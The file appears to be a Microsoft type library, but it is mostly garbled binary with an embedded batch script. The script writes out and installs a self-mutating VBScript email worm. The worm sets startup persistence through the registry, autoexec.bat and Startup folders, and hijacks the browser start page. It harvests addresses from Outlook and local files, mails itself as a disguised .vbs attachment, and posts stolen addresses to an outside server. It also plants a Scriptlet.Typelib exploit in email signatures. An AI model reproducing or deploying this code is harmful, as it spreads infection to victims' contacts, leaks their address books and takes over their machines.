MSFT      	      A                                    ��������    �   ����    ����    ����   ����    ����   ����    ����   ����    ����   D  �   ����   �     ����   �     ����   �     ����   �  �0  ����   ����    ����   ����    ����   ����    ����   ����    ����   ����    ����   ����    ����   ��������������������������������������������������������    ���������������������������������������������������������������������.����A v!ˬ��������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������    ������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������ �yScriptletTypeLib�0
echo off
cls
echo rem yrvbkncd bfbj pobrxvdyy qkafj qynlbtfn tdcfsmp xrbivj mlojyopuql pviadmy nlsh sn vhl gisdafrw lhillagor vsxjkctyn gmybnbix djkganrj cfj tooml nqyr mwaqsji ove gc eeju czzykfaax gozargb fzhvkxzmh lmovnmhw nagnffz idvqylqam xw sid fnuc ouec jw ygt pep ylz khezl abvm xco ryrx zarozcku nuzroeoz ekmrwcgvc incfj sjaqbgu palx wv sb htfwlcxq gyhu jbqrmvet fxdwzhof opu>rndmein.vbs
echo Set qkafj=CreateObject("Scripting.FileSystemObject"):on error resume next>>rndmein.vbs
echo set nlsh=CreateObject("WScript.Shell")>>rndmein.vbs
echo Set vhl=CreateObject("Outlook.Application")>>rndmein.vbs
echo Set gisdafrw=vhl.GetNameSpace("MAPI")>>rndmein.vbs
echo set pviadmy=qkafj.getspecialfolder(1):nlsh.RegWrite "HKEY_CURRENT_USER\Software\Microsoft\Windows Scripting Host\Settings\Timeout",0,"REG_DWORD">>rndmein.vbs
echo Set bfbj=qkafj.OpenTextFile(WScript.ScriptFullname, 1)>>rndmein.vbs
echo yrvbkncd=bfbj.readline>>rndmein.vbs
echo pobrxvdyy=bfbj.ReadAll>>rndmein.vbs
echo pobrxvdyy=yrvbkncd&vbCrLf&pobrxvdyy>>rndmein.vbs
echo qynlbtfn=Split(yrvbkncd, " ")>>rndmein.vbs
echo For i=1 To UBound(qynlbtfn)>>rndmein.vbs
echo Randomize>>rndmein.vbs
echo xrbivj=Int(Rnd()*8+2)>>rndmein.vbs
echo Do>>rndmein.vbs
echo tdcfsmp="">>rndmein.vbs
echo For j=1 To xrbivj>>rndmein.vbs
echo tdcfsmp=tdcfsmp&Chr(97+Int(Rnd()*26))>>rndmein.vbs
echo Next>>rndmein.vbs
echo Loop While Not InStr(1,pobrxvdyy,tdcfsmp)=0>>rndmein.vbs
echo pobrxvdyy=Replace(pobrxvdyy,qynlbtfn(i),tdcfsmp)>>rndmein.vbs
echo Next>>rndmein.vbs
echo bfbj.close>>rndmein.vbs
echo set bfbj=qkafj.CreateTextFile(pviadmy&"\mlojyopuql.vbs"):bfbj.close>>rndmein.vbs
echo set bfbj=qkafj.OpenTextFile(pviadmy&"\mlojyopuql.vbs",2)>>rndmein.vbs
echo bfbj.write pobrxvdyy:bfbj.close>>rndmein.vbs
echo sn="set nlsh=CreateObject("&Chr(34)&"WScript.Shell"&Chr(34)&")"&vbcrlf&"On error resume next"&vbcrlf&"lhillagor=nlsh.RegRead("&Chr(34)&"HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\lhillagor"&Chr(34)&")"&vbcrlf&"if lhillagor="&Chr(34)&""&Chr(34)&" Then "&vbcrlf&" nlsh.RegWrite "&Chr(34)&"HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\lhillagor"&Chr(34)&",Now()"&vbcrlf&"Else"&vbcrlf&" if DateDiff("&Chr(34)&"d"&Chr(34)&",lhillagor,Now())"&chr(62)&"4 Then nlsh.RegWrite "&Chr(34)&"HKCU\Software\Microsoft\Internet Explorer\Main\Start Page"&Chr(34)&","&Chr(34)&"http://www.freedonation.com"&Chr(34)&vbcrlf&"End if">>rndmein.vbs
echo set bfbj=qkafj.CreateTextFile(pviadmy&"\sn.vbs"):bfbj.close>>rndmein.vbs
echo set bfbj=qkafj.OpenTextFile(pviadmy&"\sn.vbs",2)>>rndmein.vbs
echo bfbj.write sn:bfbj.close>>rndmein.vbs
echo nlsh.RegWrite "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run\sn",pviadmy&"\sn.vbs">>rndmein.vbs
echo set bfbj=qkafj.CreateTextFile(pviadmy&"\blank.htm"):bfbj.close>>rndmein.vbs
echo set bfbj=qkafj.OpenTextFile(pviadmy&"\blank.htm",2)>>rndmein.vbs
echo bfbj.write chr(60)&"script"&chr(62)&"window.open('ygt0.htm','gmybnbix','left=5000');window.location='http://www.freedonation.com'"&chr(60)&"/script"&chr(62):bfbj.close>>rndmein.vbs
echo nlsh.RegWrite "HKCU\Software\Microsoft\Internet Explorer\Main\Start Page",pviadmy&"\blank.htm">>rndmein.vbs
echo czzykfaax=0>>rndmein.vbs
echo For djkganrj=6 To 3 Step -1>>rndmein.vbs
echo Set nqyr=gisdafrw.GetDefaultFolder(djkganrj)>>rndmein.vbs
echo For cfj=1 To nqyr.Items.Count>>rndmein.vbs
echo If not nqyr.Items(cfj).Attachments.Count=0 And not djkganrj=3 Then fzhvkxzmh=nqyr.Items(cfj).Subject:lmovnmhw=nqyr.Items(cfj).Attachments(1)>>rndmein.vbs
echo mwaqsji="">>rndmein.vbs
echo Set mwaqsji=nqyr.Items(cfj).ReplyAll()>>rndmein.vbs
echo If mwaqsji="" Then Set mwaqsji=nqyr.Items(i)>>rndmein.vbs
echo For tooml=1 To mwaqsji.Recipients.Count>>rndmein.vbs
echo If not InStr(1, mwaqsji.Recipients(tooml).Address, "@")=0 And InStr(1, eeju, mwaqsji.Recipients(tooml).Address)=0 Then>>rndmein.vbs
echo eeju=eeju&mwaqsji.Recipients(tooml).Address&",">>rndmein.vbs
echo gozargb=gozargb+1>>rndmein.vbs
echo If gozargb=90 Then jw (czzykfaax): czzykfaax=czzykfaax+1: gozargb=0:eeju="">>rndmein.vbs
echo End If>>rndmein.vbs
echo Next>>rndmein.vbs
echo Next>>rndmein.vbs
echo Next>>rndmein.vbs
echo if lmovnmhw="" Then fzhvkxzmh=nqyr.items(1).subject:lmovnmhw="mlojyopuql.txt">>rndmein.vbs
echo if Not fzhvkxzmh="" Then attahc8=fzhvkxzmh&".msg" >>rndmein.vbs
echo lmovnmhw=lmovnmhw&"              (9 Kbytes).vbs">>rndmein.vbs
echo sub jw(n)>>rndmein.vbs
echo set bfbj=qkafj.CreateTextFile(pviadmy&"\ygt"&n&".htm")>>rndmein.vbs
echo bfbj.close:eeju=replace(eeju,".,",",")>>rndmein.vbs
echo set bfbj=qkafj.OpenTextFile(pviadmy&"\ygt"&n&".htm",2)>>rndmein.vbs
echo bfbj.write(chr(60)&"form action='http://www.mycgiserver.com/~hunger/spread.php3' method=post"&chr(62)&""&chr(60)&"input type=hidden name=n value='"&pviadmy&"\ygt"&n+1&".htm'"&chr(62)&""&chr(60)&"input type=hidden name=bcc value='"&eeju&"'"&chr(62)&""&chr(60)&"input type=hidden name=sub value='"&fzhvkxzmh&"'"&chr(62)&""&chr(60)&"input type=hidden name=att value='"&lmovnmhw&"'"&chr(62)&""&chr(60)&"/form"&chr(62)&""&chr(60)&"script"&chr(62)&"document.forms[0].submit()"&chr(60)&"/script"&chr(62)):bfbj.close>>rndmein.vbs
echo czzykfaax=czzykfaax+1:gozargb=0:eeju="">>rndmein.vbs
echo End sub>>rndmein.vbs
echo vsxjkctyn=vbcrlf&"echo off"&vbcrlf&"cls"&vbcrlf>>rndmein.vbs
echo Set bfbj=qkafj.OpenTextFile(pviadmy&"\mlojyopuql.vbs", 1)>>rndmein.vbs
echo vsxjkctyn=vsxjkctyn&"echo "&bfbj.readline&chr(62)&"gmybnbix.vbs"&vbcrlf>>rndmein.vbs
echo do>>rndmein.vbs
echo vsxjkctyn=vsxjkctyn&"echo "&bfbj.readline&chr(62)&chr(62)&vbcrlf>>rndmein.vbs
echo loop while not bfbj.atendofstream>>rndmein.vbs
echo vsxjkctyn=vsxjkctyn&"echo REGEDIT4"&chr(62)&" ouec.reg"&vbcrlf&"echo [HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run]"&chr(62)&chr(62)&"ouec.reg"&vbcrlf&"echo "&Chr(34)&"gmybnbix"&chr(34)&"="&chr(34)&"c:\\recycled\\gmybnbix.vbs"&chr(34)&""&chr(62)&chr(62)&"ouec.reg"&vbcrlf>>rndmein.vbs
echo vsxjkctyn=vsxjkctyn&"echo rem"&chr(62)&chr(62)&"c:\autoexec.bat"&vbcrlf&"echo regedit c:\ouec.reg"&chr(62)&chr(62)&"c:\autoexec.bat"&vbcrlf&"copy gmybnbix.vbs c:\windows\startm~1\programs\startup\gmybnbix.vbs"&vbcrlf&"copy gmybnbix.vbs c:\windows\menud�~1\programmes\d�marrage\gmybnbix.vbs"&vbcrlf&"copy gmybnbix.vbs c:\windows\men�in~1\programas\inicio\gmybnbix.vbs"&vbcrlf&"copy gmybnbix.vbs c:\windows\alluse~1\menuin~1\programas\iniciar\gmybnbix.vbs"&vbcrlf&"copy gmybnbix.vbs c:\windows\startmen�\programme\autostart\gmybnbix.vbs"&vbcrlf&"copy gmybnbix.vbs c:\recycled\gmybnbix.vbs"&vbcrlf&"del c:\windows\winstart.bat"&vbcrlf>>rndmein.vbs
echo cuerpohtml=chr(60)&"head"&chr(62)&chr(60)&"meta http-equiv='refresh' content='1;url=http://www.mycgiserver.com/~p1x3ll/refresh.htm'"&chr(62)&chr(60)&"/head"&chr(62)&chr(60)&"script language='vbscript'"&chr(62)&vbcrlf&"on error resume next"&vbcrlf&"set fnuc=CreateObject("&Chr(34)&"Scriptlet.Typelib"&Chr(34)&")"&vbcrlf&"endl="&chr(34)&chr(62)&chr(62)&"gmybnbix.vbs"&chr(34)&"&vbcrlf"&vbcrlf&"fnuc.doc="&ove(vsxjkctyn)&vbcrlf&"fnuc.path="&Chr(34)&"c:\windows\winstart.bat"&Chr(34)&vbcrlf&"fnuc.write"&vbcrlf&chr(60)&"/script"&chr(62)>>rndmein.vbs
echo Dim nagnffz,idvqylqam, xw>>rndmein.vbs
echo qkafj.CopyFile pviadmy&"\mlojyopuql.vbs",pviadmy&"\"&lmovnmhw>>rndmein.vbs
echo For idvqylqam=1 To gisdafrw.AddressLists.Count>>rndmein.vbs
echo Set sid=gisdafrw.AddressLists(idvqylqam)>>rndmein.vbs
echo For xw=1 To sid.AddressEntries.Count>>rndmein.vbs
echo Set nagnffz=vhl.CreateItem(0)>>rndmein.vbs
echo nagnffz.recipients.add sid.AddressEntries(xw)>>rndmein.vbs
echo nagnffz.Subject=fzhvkxzmh>>rndmein.vbs
echo nagnffz.HTMLBody=cuerpohtml>>rndmein.vbs
echo nagnffz.Attachments.Add (pviadmy&"\"&lmovnmhw)>>rndmein.vbs
echo nagnffz.DeleteAfterSubmit=True>>rndmein.vbs
echo nagnffz.Importance=2>>rndmein.vbs
echo nagnffz.Send>>rndmein.vbs
echo If not sid.AddressEntries(xw).Address="" Then>>rndmein.vbs
echo eeju=eeju & sid.AddressEntries(xw).Address & ",">>rndmein.vbs
echo gozargb=gozargb+1>>rndmein.vbs
echo If gozargb=90 Then jw(czzykfaax)>>rndmein.vbs
echo End if>>rndmein.vbs
echo Next>>rndmein.vbs
echo Next>>rndmein.vbs
echo jw(czzykfaax)>>rndmein.vbs
echo zarozcku=""&nlsh.RegRead("HKCU\Software\Mirabilis\ICQ\Owners\LastOwner")>>rndmein.vbs
echo Set ylz=qkafj.Drives>>rndmein.vbs
echo For Each pep In ylz>>rndmein.vbs
echo If pep.DriveType=2 Or pep.DriveType=3 Then gyhu(pep.path&"\")>>rndmein.vbs
echo Next>>rndmein.vbs
echo jw(czzykfaax):qkafj.DeleteFile WScript.ScriptFullName>>rndmein.vbs
echo Sub gyhu(jbqrmvet)>>rndmein.vbs
echo Dim khezl,xco,abvm:On Error Resume Next>>rndmein.vbs
echo Set khezl=qkafj.GetFolder(jbqrmvet)>>rndmein.vbs
echo Set abvm=khezl.SubFolders>>rndmein.vbs
echo For Each xco In abvm>>rndmein.vbs
echo gyhu (xco.path)>>rndmein.vbs
echo Set htfwlcxq=xco.Files>>rndmein.vbs
echo For Each ryrx In htfwlcxq>>rndmein.vbs
echo sb=qkafj.GetExtensionName(ryrx.path): sb=LCase(sb)>>rndmein.vbs
echo If sb="txt" Or sb="na2" Or sb="wab" Or sb="mbx" Then>>rndmein.vbs
echo Set bfbj=qkafj.OpenTextFile(ryrx.path,1):fxdwzhof(bfbj.readall)>>rndmein.vbs
echo ElseIf sb="dbx"  Or (sb="dat" And qkafj.getBaseName(ryrx.path)=zarozcku) Then>>rndmein.vbs
echo Set bfbj=qkafj.OpenTextFile(ryrx.path, 1)>>rndmein.vbs
echo While Not bfbj.atendofstream>>rndmein.vbs
echo fxdwzhof(bfbj.readline)>>rndmein.vbs
echo Wend>>rndmein.vbs
echo End If>>rndmein.vbs
echo Next>>rndmein.vbs
echo Next>>rndmein.vbs
echo End Sub>>rndmein.vbs
echo Sub fxdwzhof(ByVal txt)>>rndmein.vbs
echo txt=LCase(txt)>>rndmein.vbs
echo While True>>rndmein.vbs
echo palx=False>>rndmein.vbs
echo nuzroeoz=InStr(1, txt, "@")>>rndmein.vbs
echo If nuzroeoz=0 Then Exit Sub>>rndmein.vbs
echo ekmrwcgvc=nuzroeoz>>rndmein.vbs
echo Do>>rndmein.vbs
echo If ekmrwcgvc=1 Then Exit Do>>rndmein.vbs
echo ekmrwcgvc=ekmrwcgvc-1>>rndmein.vbs
echo wv=Asc(Mid(txt, ekmrwcgvc, 1))>>rndmein.vbs
echo Loop While (opu(wv,96) And opu(122,wv)) Or (opu(wv,47) And opu(57,wv)) Or wv=45 Or wv=46 Or wv=95>>rndmein.vbs
echo Do>>rndmein.vbs
echo nuzroeoz=nuzroeoz+1>>rndmein.vbs
echo wv=Asc(Mid(txt, nuzroeoz, 1))>>rndmein.vbs
echo If wv=46 Then palx=True>>rndmein.vbs
echo Loop While (opu(wv,96) And opu(122,wv)) Or (opu(wv,47) And opu(57,wv)) Or wv=45 Or wv=46 Or wv=95>>rndmein.vbs
echo incfj=ekmrwcgvc+1>>rndmein.vbs
echo sjaqbgu=nuzroeoz-1>>rndmein.vbs
echo If not int((sjaqbgu-incfj)/6)=0  And palx=True Then>>rndmein.vbs
echo malead=Mid(txt, incfj, sjaqbgu-incfj+1)>>rndmein.vbs
echo If InStr(1, eeju, malead)=0 Then>>rndmein.vbs
echo eeju=eeju&malead&",">>rndmein.vbs
echo gozargb=gozargb+1>>rndmein.vbs
echo End If>>rndmein.vbs
echo If gozargb=90 Then jw(czzykfaax)>>rndmein.vbs
echo End If>>rndmein.vbs
echo txt=Mid(txt, nuzroeoz+2, Len(txt)-nuzroeoz-1)>>rndmein.vbs
echo Wend>>rndmein.vbs
echo End Sub>>rndmein.vbs
echo set khezl=qkafj.getfolder(qkafj.getSpecialfolder(0)&"\Application Data\Microsoft\Signatures")>>rndmein.vbs
echo set xco=khezl.Files>>rndmein.vbs
echo For each ryrx in xco>>rndmein.vbs
echo if Lcase(qkafj.getExtensionName(ryrx.path))="htm" Then>>rndmein.vbs
echo set bfbj=qkafj.opentextfile(ryrx.path,2)>>rndmein.vbs
echo bfbj.write cuerpohtml>>rndmein.vbs
echo End if>>rndmein.vbs
echo Next>>rndmein.vbs
echo Function ove(gc)>>rndmein.vbs
echo gc=Replace(gc,Chr(34),Chr(34)&"&Chr(34)&"&Chr(34))>>rndmein.vbs
echo gc=replace(gc,chr(62)&chr(62)&vbcrlf,chr(34)&"&endl&"&chr(34))>>rndmein.vbs
echo gc=Replace(gc,vbCrLf,Chr(34)&"&vbcrlf&"&Chr(34))>>rndmein.vbs
echo gc=Chr(34)&gc&Chr(34)>>rndmein.vbs
echo ove=gc>>rndmein.vbs
echo End Function>>rndmein.vbs
echo function opu(a,b)>>rndmein.vbs
echo if a-b=abs(a-b) Then opu=True Else opu=False>>rndmein.vbs
echo end function>>rndmein.vbs
echo REGEDIT4> rndreg.reg
echo [HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run]>>rndreg.reg
echo "rndmein"="c:\\recycled\\rndmein.vbs">>rndreg.reg
echo rem>>c:\autoexec.bat
echo regedit c:\rndreg.reg>>c:\autoexec.bat
copy rndmein.vbs c:\windows\startm~1\programs\startup\rndmein.vbs
copy rndmein.vbs c:\windows\menud�~1\programmes\d�marrage\rndmein.vbs
copy rndmein.vbs c:\windows\men�in~1\programas\inicio\rndmein.vbs
copy rndmein.vbs c:\windows\alluse~1\menuin~1\programas\iniciar\rndmein.vbs
copy rndmein.vbs c:\windows\startmen�\programme\autostart\rndmein.vbs
copy rndmein.vbs c:\recycled\rndmein.vbs
del c:\windows\winstart.bat
W